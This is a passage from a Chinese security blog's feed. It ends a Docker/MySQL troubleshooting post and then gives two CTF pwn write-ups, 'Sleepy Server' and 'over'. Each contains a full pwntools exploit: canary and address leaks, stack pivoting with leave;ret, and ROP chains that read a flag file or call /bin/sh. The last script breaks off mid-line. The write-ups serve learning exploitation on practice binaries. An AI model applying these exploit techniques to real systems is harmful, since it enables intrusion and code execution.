directory</code>，当时我立即使用Mysql的客户端尝试连接，结果是成功的，排除了用户名和密码问题。那么问题来了，为什么Mysql客户端可以连接成功，php的连接函数就不行。</p><p>在网上找到有关分析，使用<code>strace</code>分析之后发现，php连接函数使用的是<code>unixdomain socket</code>，同时访问的是<code>/tmp/mysql.sock</code>，这里没有这个socket文件，导致报出没有文件的错误。结合其他资料，当使用<code>localhost</code>进行连接的时候，会使用<code>unixdomain</code>的方式。这个<code>/tmp/mysql.sock</code>则是由于php没有设置mysql的默认socket，写死在源码中的默认值。</p><p>但是这就奇怪了，我在手动操作时，也是通过docker自带的安装程序安装扩展的。思考之后，发现命令的执行顺序不同，在手动配置时，我是先安装Mysql，同时开启服务之后才安装的扩展。那么来对比一下，不同的顺序php的配置会有什么不同。</p><p>先安装扩展，后开启服务。</p><img src="/2019/11/27/docker-mysql-problem-check/1.png"><p>看到这里是没有设置的状态，先开启Mysql服务，再安装扩展。</p><img src="/2019/11/27/docker-mysql-problem-check/2.png"><p>看到这里的默认socket已经设置了。所以我们在安装服务类型的扩展时，要先开启服务，再安装扩展。</p><h2 id="Mysql在docker中的服务开启问题"><a href="#Mysql在docker中的服务开启问题" class="headerlink" title="Mysql在docker中的服务开启问题"></a>Mysql在docker中的服务开启问题</h2><p>这又是个诡异的问题，和上个问题一样，在手动操作的时候<code>service mysql start</code>一点毛病没有，在自动化的时候就炸。唯一的区别是中间的交互过程，手动操作是由交互，自动化是无交互。查询日志得到<code>[ERROR] Fatal error: Can&#39;t open and lock privilege tables: Got error 140 from storage engine</code>。让人摸不着头脑，只能沿着这条线继续深入。</p><p>这个问题发生在很多用Dockerfile来build的容器上，在github的issue上也找到一些问题的回答。找到的其中一个解决方案是在<code>docker-compose.yml</code>文件中加上<code>volumes:(换行) - /var/lib/mysql</code>，我很好奇是什么机制导致必须要手动在容器内部挂载。</p><p>有些issue中提起现在docker的内部文件系统已经从<code>aufs</code>变成了<code>overlay</code>和<code>overlay2</code>，Mysql启动出现问题的都是以<code>overlay</code>系列为文件系统的docker。最后找到了docker在<code>overlay2</code>的文档中的一段对打开文件操作的描述。</p><blockquote><p>open(2): OverlayFS only implements a subset of the POSIX standards. This can result in certain<br>OverlayFS operations breaking POSIX standards. One such operation is the copy-up operation. Suppose that your application calls fd1=open(“foo”, O_RDONLY) and then fd2=open(“foo”, O_RDWR). In this case, your application expects fd1 and fd2 to refer to the same file. However, due to a copy-up operation that occurs after the second calling to open(2), the descriptors refer to different files. The fd1 continues to reference the file in the image (lowerdir) and the fd2 references the file in the container (upperdir). A workaround for this is to touch the files which causes the copy-up operation to happen. All subsequent open(2) operations regardless of read-only or read-write access mode will be referencing the file in the container (upperdir).</p><p>yum is known to be affected unless the yum-plugin-ovl package is installed. If the yum-plugin-ovl package is not available in your distribution such as RHEL/CentOS prior to 6.8 or 7.2, you may need to run touch /var/lib/rpm/* before running yum install. This package implements the touch workaround referenced above for yum.</p></blockquote><p>大体的意思就是，新的<code>overlay</code>文件系统仅仅只实现了<code>POSIX</code>标准的一部分，这就导致某些操作会有异常，比如以两种不同的打开标准操作同一个文件，这里就会让其中的一些操作是针对镜像中的文件，另外一些是针对容器中的文件，这样我们的应用本该是只能控制容器内的文件，却对镜像中的这个文件有操作，从而出现异常。里面给出的解决方案是在启动我们的服务应用之前，把需要操作的文件全部<code>touch</code>一遍。</p><p>所以第二种解决方案是在启动服务之前全部<code>touch</code>一遍<code>find /var/lib/mysql -type f -exec touch {} \;</code>。但是事情还没完，为什么在docker build的阶段会这样，而我们手动操作的时候不会出现，答案已经很明显了。只有在docker build的阶段才会有可能产生对镜像内的文件操作，但是我们手动执行时已经是确确实实的在容器中了，也就只能操作容器内的文件，类似<code>open(2)</code>的操作对镜像中的文件不会有干扰。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到某些奇怪的现象不要停留在表象，要知其所以然，不要想当然。其次，这次的情况就可以看出中文资料非常有限，所以用英文搜索是一种必备技巧。最后，官方文档是一个宝藏，遇到项目问题可能文档中就有答案。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://stackoverflow.com/questions/38165407/installing-lightdm-in-dockerfile-raises-interactive-keyboard-layout-menu" target="_blank" rel="noopener">https://stackoverflow.com/questions/38165407/installing-lightdm-in-dockerfile-raises-interactive-keyboard-layout-menu</a></p><p><a href="https://my.oschina.net/scgywx/blog/1545301" target="_blank" rel="noopener">https://my.oschina.net/scgywx/blog/1545301</a></p><p><a href="https://github.com/geerlingguy/drupal-vm/issues/1497" target="_blank" rel="noopener">https://github.com/geerlingguy/drupal-vm/issues/1497</a></p><p><a href="https://github.com/docker/for-linux/issues/72" target="_blank" rel="noopener">https://github.com/docker/for-linux/issues/72</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下，我在docker容器中配置Mysql时遇到的坑，以及处理过程中学到的知识。&lt;/p&gt;
&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;最近作业量多，任务重结果还是被点名出题（
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="docker" scheme="https://hurricane618.me/tags/docker/"/>
    
      <category term="Mysql" scheme="https://hurricane618.me/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>CNSS招新题中的一道ROP题</title>
    <link href="https://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/"/>
    <id>https://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/</id>
    <published>2019-11-11T02:34:09.000Z</published>
    <updated>2019-11-11T02:37:05.600Z</updated>
    
    <content type="html"><![CDATA[<p>CNSS招新题目中有两道不错的Pwn题，拿来学习一波知识。然而其中有一道是内核ROP，复现了好几天。。还是有点问题，再加上研究生大作业集群来了（完全不能摸鱼，哭唧唧），所以那道内核题能做出来就放博客。</p><h2 id="Sleepy-Server"><a href="#Sleepy-Server" class="headerlink" title="Sleepy Server"></a>Sleepy Server</h2><p>这道题checksec发现防御全开，同时给了libseccomp，看来是对libc的调用有一定限制。</p><img src="/2019/11/11/cnss-recruit-pwn-1/1.png"><p>可以看到禁用了execve，不能通过直接拿shell获得flag。开始分析整个程序，看看有什么利用点。</p><img src="/2019/11/11/cnss-recruit-pwn-1/2.png"><p>比较容易的就能看到<code>buf</code>有一个溢出，但是溢出的数量有限只有0x10字节，随后看到我们输入的用户名和密码被传入一个函数判断，判断的结果正确才会进入漏洞点，我们继续跟进<code>sub_E9D</code>函数。</p><img src="/2019/11/11/cnss-recruit-pwn-1/3.png"><p>在这里我们发现只对<code>a2</code>有相关操作，也就是我们输入的密码。首先一个临时数组保存<code>v3 ^ a2[i]</code>的数据，并且将这个数据更新到<code>v3</code>上。也就是说每次异或操作都是和上一轮异或的结果和这轮的字符，同时临时保存的每轮异或数据要和<code>v8</code>开始的一系列值相等。</p><p>从上面看一共有12个值，那么密码的长度肯定是12，这样我们有每轮异或最后的结果可以异或操作逆推回去。原始输入的结果就等于这轮异或结果与上一轮异或结果相异或，然后第一轮是这轮结果与0异或得到。解密代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">115</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">9</span>, <span class="number">122</span>, <span class="number">14</span>, <span class="number">107</span>, <span class="number">27</span>]</span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    passwd += chr(i ^ v3)</span><br><span class="line">    v3 = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> passwd</span><br></pre></td></tr></table></figure><p>最后拿到的密码是<code>step_by_step</code>，这样我们就能顺利进入漏洞触发点了。</p><p>我们继续看<code>main</code>函数，同样很容易发现有两次<code>printf</code>，由于程序是开启了<code>canary</code>保护的，我们需要先泄露才行，而这里有两次输出，那么第一次输出就是为了泄露数据。最后8个字节为<code>canary</code>，通常这个值的最低位为0，我们也是只需要把这个0覆盖掉，就能让<code>printf</code>把后面的<code>canary</code>和<code>rbp</code>一起输出。有了<code>rbp</code>的数据我们能通过调试知道这个<code>rbp</code>和程序的起始地址的差值，从而得到程序的起始基地址，从而同时解决了地址随机化的问题。</p><p>现在目光集中在下一次输入的溢出上，这里只能溢出16字节，这意味着我们只能覆盖<code>rbp</code>和<code>ret_address</code>，溢出位数不够怎么解决？现在我的思路有两个</p><ol><li>利用<code>one_gadget</code>一次性获得shell（可能性较小，因为seccomp的原因）</li><li>移动栈帧，把栈帧移动到我们能写入的地方，以此来构造ROP chain</li></ol><p>使用<code>one_gadget</code>进行尝试，意料之中的失败。。ROP大师的题目果然是不能偷鸡成功的。</p><p>移动栈帧的<code>leave ret</code>在程序中比较常用，还是很好找，同时我们有程序的基地址也就能找到我们写入的地址。</p><p>第一次的返回地址填入漏洞点的上方，也是为了在第一次读入数据之后再次获得读入数据的机会，然后第二次读入的时候<code>rbp</code>填入我们的可控地址，返回地址填入<code>leave ret</code>的gadget。这样在read之后会调用一次<code>leave</code>，<code>ret</code>之后又会有第二次<code>leave</code>来让栈帧移动。随后就是无限重复第二次动作，来完成ROP。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template rop</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'rop'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'rop'</span></span><br><span class="line"><span class="comment">#libc = exe.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote(<span class="string">'139.9.5.20'</span>, <span class="string">'60607'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libseccomp.so.2"</span>&#125;)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0xb8</span> * <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">io.sendline(<span class="string">'whz'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">io.sendline(<span class="string">'step_by_step'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'tell me what you say\n'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="number">0xb8</span> * <span class="string">'a'</span> + <span class="string">'\n'</span>)</span><br><span class="line">canary = u64(<span class="string">'\x00'</span> + io.recv(<span class="number">7</span>))</span><br><span class="line">elf_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1180</span></span><br><span class="line">info(<span class="string">'canary:'</span>+hex(canary))</span><br><span class="line">info(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line"></span><br><span class="line">bss=elf_base+<span class="number">0x00202500</span> <span class="comment">#这里不是bss段 但是是一段空白数据区域 可以任意写入</span></span><br><span class="line">buf=bss+<span class="number">0x200</span></span><br><span class="line">buf2=buf+<span class="number">0x200</span></span><br><span class="line">file_place=buf2+<span class="number">0x200</span> <span class="comment"># string ./flag\x00</span></span><br><span class="line">buf3=file_place+<span class="number">0x200</span></span><br><span class="line">file_name=<span class="string">'./flag\x00\x00'</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x11e3</span> + elf_base</span><br><span class="line">pop_rbp_ret = <span class="number">0x0b70</span> + elf_base</span><br><span class="line">read_ret = <span class="number">0x1144</span> + elf_base</span><br><span class="line">leave_ret = <span class="number">0x1176</span> + elf_base</span><br><span class="line">read_got = exe.got[<span class="string">'read'</span>] + elf_base</span><br><span class="line">puts_plt = exe.plt[<span class="string">'puts'</span>] + elf_base</span><br><span class="line">read_plt = exe.plt[<span class="string">'read'</span>] + elf_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0xb8</span> * <span class="string">'b'</span></span><br><span class="line">payload2 += p64(canary)</span><br><span class="line">payload2 += p64(buf)</span><br><span class="line">payload2 += p64(read_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'I will go to sleep\n'</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p64(pop_rdi_ret)</span><br><span class="line">payload3 += p64(read_got)</span><br><span class="line">payload3 += p64(puts_plt)</span><br><span class="line">payload3 += p64(pop_rbp_ret)</span><br><span class="line">payload3 += p64(file_place + <span class="number">0xc0</span>)</span><br><span class="line">payload3 += p64(read_ret)</span><br><span class="line">payload3 += <span class="number">17</span> * p64(<span class="number">0</span>) <span class="comment"># padding to len=0xb8</span></span><br><span class="line">payload3 += p64(canary)</span><br><span class="line">payload3 += p64(buf - <span class="number">0xc8</span>)</span><br><span class="line">payload3 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line">read_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">info(<span class="string">"libc base:"</span> + hex(libc_base))</span><br><span class="line">pop_rsi_ret = <span class="number">0x23e6a</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">open_addr = libc.symbols[<span class="string">'open'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">payload4 = file_name</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(file_place)</span><br><span class="line">payload4 += p64(pop_rsi_ret)</span><br><span class="line">payload4 += p64(<span class="number">0</span>)</span><br><span class="line">payload4 += p64(open_addr)</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(<span class="number">3</span>)</span><br><span class="line">payload4 += p64(pop_rsi_ret)</span><br><span class="line">payload4 += p64(buf3)</span><br><span class="line">payload4 += p64(pop_rdx_ret)</span><br><span class="line">payload4 += p64(<span class="number">0x30</span>)</span><br><span class="line">payload4 += p64(read_plt)</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(buf3)</span><br><span class="line">payload4 += p64(puts_plt)</span><br><span class="line">payload4 += (<span class="number">0xb8</span> - len(payload4))/<span class="number">8</span> * p64(<span class="number">0</span>)</span><br><span class="line">payload4 += p64(canary)</span><br><span class="line">payload4 += p64(file_place)</span><br><span class="line">payload4 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.send(payload4)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>一开始不知道如何确定ELF的基地址。。求助了<code>@Tangent</code>得到exp，然后分析之后才知道是可以通过<code>rbp</code>相对位移来确定。之后在复现的过程中也遇到过一些坑：</p><ol><li>用<code>leave ret</code>来移动栈帧的时候要注意移动之后要在目标地址多填充8字节，这是因为<code>leave</code>要<code>pop rbp</code>的原因；</li><li>这里用的libc是libc-2.27，我最先使用的libc-2.23，也是没有注意题目的提醒<code>Ubuntu 18.04</code>；</li><li>还有就是我为了偷懒<code>read</code>读入数据的地址一开始是<code>file_name</code>的地方，结果发现老是读出来的是乱码，调试之后发现明明能成功读取到字符串，然后调<code>puts</code>输出的时候莫名其妙的就不行？？？随后把读入的数据放在其他地方就好了。。。如果有大佬知道是怎么回事的，求告知；</li></ol><img src="/2019/11/11/cnss-recruit-pwn-1/4.png"><p>最后拿到flag，<code>cnss{r00oopp_1s_e45y_I_10v3_r0o00op}</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CNSS招新题目中有两道不错的Pwn题，拿来学习一波知识。然而其中有一道是内核ROP，复现了好几天。。还是有点问题，再加上研究生大作业集群来了（完全不能摸鱼，哭唧唧），所以那道内核题能做出来就放博客。&lt;/p&gt;
&lt;h2 id=&quot;Sleepy-Server&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
  </entry>
  
  <entry>
    <title>花式栈溢出学习</title>
    <link href="https://hurricane618.me/2019/09/14/fancy-rop-practice/"/>
    <id>https://hurricane618.me/2019/09/14/fancy-rop-practice/</id>
    <published>2019-09-14T09:50:16.000Z</published>
    <updated>2019-09-14T16:23:11.891Z</updated>
    
    <content type="html"><![CDATA[<p>继续进行着栈溢出的练习，这次是参考了ctf-wiki上面的演示题目，在复现过程中的一些记录。</p><h2 id="over"><a href="#over" class="headerlink" title="over"></a>over</h2><p>安恒月赛的题目，首先看程序保护，开启了NX，不能写shellcode，同时分析了程序结果发现buffer有0x50，但是输入有0x60也就是说只能覆盖rbp和ret地址，所以必须要改变栈的位置。</p><p>首先是一个trick，里面读入的函数是<code>read</code>，所以读入的数据是不会自动加上<code>\0</code>的，其他的两个函数<code>gets</code>和<code>scanf</code>都会对读入的字符串加上<code>\0</code>截断。利用这个差异性，我们只要填入0x50个非0数据，这样<code>puts</code>就会打印出rbp的值。泄露出栈基址之后，我们就能利用相对偏移来确定题目随意的栈地址。</p><p>这样我们输入80个a，在puts的地方下断点，看看gdb里面的信息。</p><img src="/2019/09/14/fancy-rop-practice/1.png"><p>在输出我们数据的时候rbp的值为<code>0x7fffffffdc20</code>，然后观察我们的栈顶处的地址为<code>0x7fffffffdbb0</code>。我们这里利用的思路是伪造栈帧，在这里我们泄露出来rbp的值通过位移差我们就能得到栈的起始地址。之后伪造的格式如下：</p><p>| 8字节fake rbp | 需要调用的地址 |…| stack addr | leave ret addr |</p><p>这种技术是通过两次调用<code>leave</code>来劫持<code>rsp</code>的值，使得它最终指向我们要调用的地址处执行<code>ret</code>，通过控制<code>rsp</code>的值来控制<code>rip</code>。</p><p>因为函数在正常调用结束的时候会<code>leave; ret;</code>，这样我们设置的<code>stack addr</code>覆盖了原始的<code>rbp</code>，那么<code>leave</code>中会<code>mov rsp, rbp； pop rbp</code>。<code>rsp</code>会成为指向<code>stack addr</code>的指针，然后<code>pop rbp</code>将我们伪造的值给<code>rbp</code>。但是在之后再次执行一次<code>leave; ret</code>，我们现在的<code>rsp</code>就会指向我们构造的地址处，将<code>fake rbp</code>填入<code>rbp</code>中，这之后的<code>ret</code>就会将填充的调用地址作为返回地址来处理，这样就成功劫持了控制流.</p><p>所以上面那张图我们得到泄露出来的<code>rbp</code>的值减去0x70就是我们输入缓冲区的栈顶地址。我们拿到地址之后伪造栈帧泄露libc的地址，然后再次伪造栈帧getshell。其中第二次构造的时候，栈的位置会有一定偏移，需要调试获取</p><img src="/2019/09/14/fancy-rop-practice/2.png"><p>从上图可以知道在第二次伪造栈帧输入的时候栈顶地址为<code>0x7fffffffdb80</code>，而我们一开始获取的栈地址为<code>0x7fffffffdbb0</code>，相差0x30，在构造的时候需要修正一下。最后给出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template over.over</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'over.over'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'over.over'</span></span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path)</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4006be</span></span><br><span class="line">rdi_ret_addr = <span class="number">0x400793</span></span><br><span class="line">rsi_r15_ret_addr = <span class="number">0x400791</span></span><br><span class="line">rdx_ret_offset = <span class="number">0x1b92</span></span><br><span class="line">vul_addr = <span class="number">0x400676</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, 'b *0x4006b9\n')</span></span><br><span class="line">pause()</span><br><span class="line">io.send(payload1) <span class="comment"># note the '\n'</span></span><br><span class="line">pause()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - <span class="number">0x70</span> <span class="comment"># debug and get it</span></span><br><span class="line">success(<span class="string">'stack: &#123;:#x&#125;'</span>.format(stack_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">payload2 += p64(rdi_ret_addr)</span><br><span class="line">payload2 += p64(exe.got[<span class="string">'puts'</span>])</span><br><span class="line">payload2 += p64(exe.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload2 += p64(vul_addr)</span><br><span class="line">payload2 += <span class="string">'c'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += p64(stack_addr)</span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">'libc address: &#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line">rdx_ret_addr = libc.address + rdx_ret_offset</span><br><span class="line"><span class="comment">#payload3 = 'c' * 80 debug and get the stack offset 0x30</span></span><br><span class="line">payload3 = <span class="string">'c'</span> * <span class="number">8</span></span><br><span class="line">payload3 += p64(rdi_ret_addr)</span><br><span class="line">payload3 += p64( next(libc.search(<span class="string">"/bin/sh"</span>)))</span><br><span class="line">payload3 += p64(rsi_r15_ret_addr)</span><br><span class="line">payload3 += p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(rdx_ret_addr)</span><br><span class="line">payload3 += p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(libc.symbols[<span 